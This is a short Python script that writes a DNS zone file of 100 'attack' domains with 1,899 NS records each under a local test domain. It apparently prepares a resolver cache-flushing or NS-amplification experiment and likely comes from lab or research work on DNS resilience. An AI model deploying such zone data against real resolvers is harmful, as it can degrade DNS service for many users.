with open('NSCacheFlush_zone_file.txt', 'w') as f:
    DOMAINS_NUM = 100
    for i in range(DOMAINS_NUM):
        for j in range(1,1900):
            print(f'attack{i}	3600	IN	NS	auth{j}.fun.lan.', file=f)
